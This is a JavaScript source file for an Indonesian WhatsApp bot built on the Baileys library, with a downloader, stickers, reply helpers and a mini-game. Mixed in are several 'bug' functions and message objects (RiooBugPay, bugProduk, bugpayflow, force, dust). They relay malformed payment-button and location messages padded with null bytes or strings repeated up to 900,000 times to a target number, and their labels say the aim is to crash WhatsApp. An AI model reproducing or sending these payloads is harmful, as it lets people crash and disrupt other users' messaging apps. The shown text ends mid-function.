/*
   * Base Simpel
   * Created By Siputzx Production 
*/
const { ryozingodConnect, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

require("./config")
const fs = require('fs')
const os = require('os');
const util = require('util')
const chalk = require("chalk");
const axios = require('axios')
const yts = require ('yt-search');
const ytdl = require("ytdl-core");
const { exec } = require("child_process")
const { randomBytes } = require('crypto') 
const Tesseract = require('tesseract.js');
const { addExif, addExifAvatar } = require('./lib/exif')
const levelling = require("./lib/levelling");
const { createCanvas, loadImage } = require('canvas');
const { formatSize, sleep, runtime, getBuffer, getRandom, fetchJson, jsonformat, toRupiah, getGroupAdmins, randomNumber } = require("./lib/myfunc");
const { tiktokslide, Animedif, searchSpotifyTracks, mediafire, igdl, realistic, findSongs, remini, capcut, livecharttba, chat, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const { downloadTrack, searchSpoti } = require('./lib/spotify')
const {
jadibot, 
stopjadibot,
listjadibot 
} = require('./clonebot/jadibot')

module.exports = async (ptz, m) => {
const { type, content, sender, pushName, isGroup, mtype } = m
try {
if (global.db.data == null) await loadDatabase()
    require('./src/schema')(m);
    var chats = global.db.data.chats[m.chat],
        users = global.db.data.users[m.sender]
        settings = global.db.data.settings
const body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);

//Database 
const pendaftar = JSON.parse(fs.readFileSync('./lib/database/pendaftar.json'))
let limitnya = db.data.users[m?.sender].limit
let balancenya = db.data.users[m?.sender].balance

const { editmsg, IosShot, location, sendPaymentInfoMessage, coresix, zodyck, sendAnnotations } = require("./bug/system")

const isSticker = (type == 'stickerMessage')
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isAudio = (type == 'audioMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

const budy = (typeof m.text === 'string') ? m.text : '';
const from = m.key.remoteJid
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const fatkuns = m && (m?.quoted || m);
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const canvas = createCanvas(700, 250);
const ctx = canvas.getContext('2d');
const text = q = args.join(" ")
const sender = m.key.fromMe ? (ptz.user.id.split(':')[0]+'@s.whatsapp.net' || ptz.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await ptz.decodeJid(ptz.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = [ptz.decodeJid(ptz.user.id), ...global.rowner.map(([number]) => number), ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isUser = pendaftar.includes(m.sender)
const isMedia = /image|video|sticker|audio/.test(mime)
const qmsg = (quoted.msg || quoted)
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender;
const isPremium = db.data.users[m?.sender].premium == true ? true : m?.sender == rowner ? true : false
const welcm = m.isGroup ? wlcm.includes(from) : false
// GROUP
const groupMetadata = m?.isGroup ? await ptz.groupMetadata(m?.chat).catch(e => {}) : {};
//SCRAPE
const { chatAI, fetchUser } = require("./lib/scrape/scrape-ai")
const { ytdlnew } = require('./lib/ytdlnew')
const { tiktoks } = require('./lib/tiktoks')
const uploadImage = require('./lib/uploadImage.js')
let Button = require("./lib/button");
let btn = new Button();
//Group 
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const isPetualang = users.petualang
const isMonay = users.balance
const isCekDarah = users.darah
const isUmpan = users.umpan
//const isSewa = _sewa.checkSewaGroup(from, sewa)
const isPotion = users.potion
const isIkan = users.ikan
const isAyam = users.ayam
const isKelinci = users.kelinci
const isDomba = users.domba
const isSapi = users.sapi
const isGajah = users.gajah
const isBesi = users.besi
const isEmas = users.emas
const isEmerald = users.emerald
//Functions

async function uselimit() {
if (isCreator) return
global.db.data.users[m?.sender].limit -= 1
}

async function RiooBugPay(target){
				await ptz.relayMessage(
					target,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: target } },
					{ messageId: null }
				);
				}
const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `KyuuRzy icikiwir`
}
}
}
    
const dust = {
"key": {
"remoteJid": "status@broadcast",
"participant": "0@s.whatsapp.net",
"fromMe": false
},
"message": {
"interactiveMessage": {
"header": {
"title": ""
},
"body": {
"text": "▾ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ▾"
},
"footer": {
"text": "by - dovure"
},
"nativeFlowMessage": {
"messageParamsJson": "".repeat(900000)
}
}}}
    
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await ptz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

    async function bugProduk(target, kuwoted) {
      var msg = generateWAMessageFromContent(target, proto.Message.fromObject({
        listMessage: {
          title: '𝖘𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌' + "\0".repeat(999999),
          footerText: '.',
          description: '.',
          buttonText: null,
          listType: 2,
          productListInfo: {
            productSections: [{
              title: "anjay",
              products: [{
                productId: "4392524570816732"
              }]
            }],
            productListHeaderImage: {
              productId: "4392524570816732",
              jpegThumbnail: null
            },
            businessOwnerJid: '0@s.whatsapp.net'
          }
        },
        footer: 'puki',
        contextInfo: {
          expiration: 604800,
          ephemeralSettingTimestamp: "1679959486",
          entryPointConversionSource: "global_search_new_chat",
          entryPointConversionApp: "whatsapp",
          entryPointConversionDelaySeconds: 9,
          disappearingMode: {
            initiator: "INITIATED_BY_ME"
          }
        },
        selectListType: 2,
        product_header_info: {
          product_header_info_id: 292928282928,
          product_header_is_rejected: true
        }
      }), {userJid: target, quoted: kuwoted});
      await ptz.relayMessage(target, msg.message, { participant: { jid: target }, messageId: msg.key.id});
    }
    
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/thumbnail/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

async function sendLiveLocationMessage2(target, kuoted) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "p",
            degreesLongitude: "p",
            caption: "K-Tech" + ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(50000),
            sequenceNumber: "0",
            jpegThumbnail: ""
          }
        }
      }
    }), {
      userJid: target,
      quoted: kuoted
    });
    await ptz.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
}

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/thumbnail/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
    
async function downloadMp3(q) {
  try {
    const response = await axios.post('https://api.kyuurzy.tech/api/download/ytdl', {
      text: q
    }, {
      headers: {
        'accept': '*/*',
        'api_key': 'free',
        'Content-Type': 'application/json'
      }
    });
    
    return response.data
  } catch (error) {
    console.error('Error:', error);
  }
}

async function downloadMp4 (link) {
try {
ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
ptz.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

msToDate = (ms) => {
  let years = Math.floor(ms / (1000 * 60 * 60 * 24 * 365));
  let months = Math.floor(
    (ms % (1000 * 60 * 60 * 24 * 365)) / (1000 * 60 * 60 * 24 * 30)
  );
  let weeks = Math.floor(
    (ms % (1000 * 60 * 60 * 24 * 30)) / (1000 * 60 * 60 * 24 * 7)
  );
  let days = Math.floor(
    (ms % (1000 * 60 * 60 * 24 * 7)) / (1000 * 60 * 60 * 24)
  );
  return `${years} tahun ${months} bulan ${weeks} minggu ${days} hari`;
};


msToDay = (ms) => {
  let temp = ms;
  let years = Math.floor(temp / (365 * 24 * 60 * 60 * 1000));
  temp = temp % (365 * 24 * 60 * 60 * 1000);
  let months = Math.floor(temp / (30 * 24 * 60 * 60 * 1000));
  temp = temp % (30 * 24 * 60 * 60 * 1000);
  let weeks = Math.floor(temp / (7 * 24 * 60 * 60 * 1000));
  temp = temp % (7 * 24 * 60 * 60 * 1000);
  let days = Math.floor(temp / (24 * 60 * 60 * 1000));
  temp = temp % (24 * 60 * 60 * 1000);
  let hours = Math.floor(temp / (60 * 60 * 1000));
  temp = temp % (60 * 60 * 1000);
  let minutes = Math.floor(temp / (60 * 1000));
  temp = temp % (60 * 1000);

  let result = "";
  if (years > 0) {
    result += years + (years > 1 ? " tahun " : " tahun ");
  }
  if (months > 0) {
    result += months + (months > 1 ? " bulan " : " bulan ");
  }
  if (weeks > 0) {
    result += weeks + (weeks > 1 ? " minggu " : " minggu ");
  }
  if (days > 0) {
    result += days + (days > 1 ? " hari " : " hari ");
  }
  if (hours > 0) {
    result += hours + (hours > 1 ? " jam " : " jam ");
  }
  if (minutes > 0) {
    result += minutes + (minutes > 1 ? " menit " : " menit ");
  }
  return result.trim();
};

try {
    ppuser = await ptz.profilePicture(who, 'image')
    } catch (err) {
    ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
    }
    ppnyauser = await getBuffer(ppuser)

async function getRandom(min, max) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}

const fverif = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    'message': {
        extendedTextMessage: {
            text: Styles(`_wabot by ${ownername}_`)
        }
    }
    }


    async function bugpayflow(userJidx) {
            for (let i = 0; i < 20; i++) {
              const qpaybutton = {
                name: "payment_info",
                buttonParamsJson: JSON.stringify({
                  currency: "MYR",
                  total_amount: {
                  value: 999999999999,
                  offset: 999999999999
                  },
                  reference_id: "X0D3SK9ZD3V",
                  type: "physical-goods",
                  order: {
                    status: 'pending',
                    subtotal: {
                    value: 999999999999,
                    offset: 999999999999
                    },
                    order_type: 'ORDER',
                    items: [{
                      name: "📄 SCRIPT BUG VIRDARK . X ONE MYR.𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦",
                      amount: {
                      value: 999999999999,
                      offset: 999999999999
                      },
                      quantity: 999999999999,
                      sale_amount: {
                      value: 999999999999,
                      offset: 999999999999
                      },
                    }]
                  },
                  payment_settings: [{
                    type: "pix_static_code",
                    pix_static_code: {
                      merchant_name: "SkyzDeveloper",
                      key: "WDX",
                      key_type: 'Q'
                    }
                  }]
                })
              };
              const nativeFlowMessage = {
                buttons: [qpaybutton]
              };
              const interactiveMessage = {
                nativeFlowMessage: nativeFlowMessage
              };
              const message = {
                messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {}
                },
                interactiveMessage: interactiveMessage
              };
              const viewOnceMessage = {
                message: message
              };
              const vrdrk = {
                viewOnceMessage: viewOnceMessage
              };
              await ptz.relayMessage(userJidx, vrdrk, {
                participant: {
                  jid: userJidx
                }
              });
            }
            for (let j = 0; j < 3; j++) {
              const header = {
                title: '',
                subtitle: " "
              };
              const body = {
                text: "📄 SCRIPT BUG VIRDARK . CRASH ‍📄.SKYZCRASHED . ‍📄.SKYZCRASHED . ‍📄.SKYZCRASHED .𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦"
              };
              const footer = {
                'text': "📄 SCRIPT BUG VIRDARK . CRASH ؂؃؂؃.؂؃؂؃.؂؃؂؃"
              };
              const displaybuttons = {
                name: "cta_url",
                buttonParamsJson : JSON.stringify({
                  display_text: "C҉R҉A҉S҉H҉ W҉H҉A҉T҉S҉A҉P҉P҉꙰꙰",
                  url: '',
                  merchant_url: ''
                })
              };
              const vrdrknew = {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: header,
                      body: body,
                      footer: footer,
                      nativeFlowMessage: {
                        buttons: [displaybuttons],
                        messageParamsJson: ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(100000)
                      }}}}};
              await ptz.relayMessage(userJidx, vrdrknew, { participant: { jid: userJidx
                }})}}

async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: m.pushname, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await ptz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botname}`, mediaType: 3,renderLargerThumbnail : true,thumbnailUrl:`https://telegra.ph/file/7e03b6846ec421b9d8fba.jpg`,sourceUrl: `https://kyuurzy.site`
}}, sticker: nah }, { quoted: m })
await fs.unlinkSync(stok)
}

const pickRandom = (arr) => {
        return arr[Math.floor(Math.random() * arr.length)]
        }
        
var randomColor = ['#232023'];
const apiColor = randomColor[Math.floor(Math.random() * randomColor.length)];

if (budy.includes("@everyone")) {
    if(!isCreator) return
    if (m.isGroup) {
        if (isAdmins || isBotAdmins) {
            return ptz.sendMessage(m.chat, {
                text: body.replace(/@everyone/i, '@' + m.chat),
                contextInfo: {
                    mentionedJid: (await ptz.groupMetadata(m.chat)).participants.map(v => v.id),
                    groupMentions: [{
                        groupSubject: "everyone",
                        groupJid: m.chat
                    }]
                }
            })
        }
    }
    }

ptz.sendUrlKu = async (jid, title, footwr, options = {}) => {
    const msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: title
                    },
                    footer: {
                        text: footwr
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Saluran WhatsApp \",\"url\":\"${saluran}\",\"merchant_url\":\"${saluran}\"}`
                        }]
                    },
                    contextInfo: {
                        mentionedJid: await ments(title),
                        quotedMessage: m.message,
                        participant: m.sender,
                        ...m.key,
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idsal,
                        newsletterName: Tasistent, 
                        serverMessageId: -1
                    }
                  },
                }
            }
        }
    };
    return ptz.relayMessage(jid, msg, {});
    }

async function falseR () {
ptz.sendReact(m.chat, '❌', m.key)
}

function monospace(string) {
return '```' + string + '```'
}

async function reply(txt) {
const RiooAjah = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: botname,
newsletterJid: "120363192092636321@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: `Anyone - MD V0.1.3`,
body: 'Subscribe My YouTube',
thumbnailUrl: 'https://telegra.ph/file/a474435589bd136998d19.jpg',
sourceUrl: 'https://www.youtube.com/@GhostXdzz2',
},
},
text: txt,
}
return ptz.sendMessage(m.chat, RiooAjah, {
quoted: m,
})
}

async function replymenu(wow) {
ptz.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
fileName: "𝗔𝗻𝘆𝗼𝗻𝗲 - 𝗔𝗜🌠",
mimetype: "application/pdf",
fileLength: 99999,
pageCount: 666,
caption: wow,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: "Anyone - Assistant",
newsletterJid: "120363295825562726@newsletter",
},
externalAdReply: {  
title: global.foter, 
body: '©𝗚𝗵𝗼𝘀𝘁𝗫𝗱𝘇𝘇🌠',
thumbnailUrl: 'https://cdn.meitang.xyz/file/BQACAgUAAxkDAAJen2bkU-uC3JbL1kJiVnf9wFRkbyiYAALOKQACaQIhVyxv24t8ajMsNgQ',
sourceUrl: global.url, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})}

//Batas 
const moment = require('moment-timezone');
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};

if (isCmd && !isUser) {
pendaftar.push(m.sender)
fs.writeFileSync('./lib/database/pendaftar.json', JSON.stringify(pendaftar, null, 2))
}

if (m.message) {
if (isCmd && !m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
} else if (m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`)));
}
}
//ResponsGame

try {
let id = m.chat;
let timeout = 180000;
let hadiah = randomNumber(10000, 20000);
let users = global.db.data.users[m.sender];
let budy = typeof m.body == 'string' ? m.body : false;
ptz.bomb = ptz.bomb ? ptz.bomb : {};

if (ptz.bomb[id] && !isNaN(body) && !isCmd) {
let json = ptz.bomb[id][1].find(v => v.position == body);
if (!json) return
if (json.emot == '💥') {
json.state = true;
let bomb = ptz.bomb[id][1];
let teks = `*DUARRRRRR 💥*\n\n`;
teks += bomb.slice(0, 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += bomb.slice(3, 6).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += bomb.slice(6).map(v => v.state ? v.emot : v.number).join('') + '\n\n';
teks += `@${m.sender.split("@")[0]} membuka kotak yang berisi *Bom* Game di hentikan!`
ptz.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/da5e5612ccead39af2e93.jpg", title: " 🎮  𝗚 𝗔 𝗠 𝗘 - 𝗧 𝗘 𝗕 𝗔 𝗞 - 𝗕 𝗢 𝗢 𝗠  🎮", body: null, renderLargerThumbnail: true, sourceUrl: null, mediaType: 1}}}, {quoted: kalgans}).then(() => {
clearTimeout(ptz.bomb[id][2]);
delete ptz.bomb[id];
});
} else if (json.state) {
return ptz.sendText(m.chat, `Kotak ${json.number} sudah di buka silahkan pilih kotak yang lain!`, m);
} else {
json.state = true;
let changes = ptz.bomb[id][1];
let open = changes.filter(v => v.state && v.emot != '💥').length;

if (open >= 8) {
let teks = `*🎮 GAME TEBAK BOM 🎮*\n\nKirim angka *1* - *9* untuk membuka *9* kotak nomor di bawah ini :\n\n`;
teks += changes.slice(0, 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(3, 6).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(6).map(v => v.state ? v.emot : v.number).join('') + '\n\n';
teks += `*Permainan selesai!* kotak berisi bom tidak terbuka\n*+ $${toRupiah(hadiah)} balance* ke @${m.sender.split("@")[0]}`;

ptz.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender]}}, {quoted: kalgans}).then(() => {
db.data.users[m.sender].balance += hadiah;
clearTimeout(ptz.bomb[id][2]);
delete ptz.bomb[id];
});
} else {
let teks = `*🎮 GAME TEBAK BOM 🎮*\n\nKirim angka *1* - *9* untuk membuka *9* kotak nomor di bawah ini :\n\n`;
teks += changes.slice(0, 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(3, 6).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(6).map(v => v.state ? v.emot : v.number).join('') + '\n\n';
teks += `Waktu : *${((timeout / 1000) / 60)} menit*\n`;
teks += `Kotak berisi bom tidak terbuka\n*+ $${toRupiah(hadiah)} balance* ke @${m.sender.split("@")[0]}`;

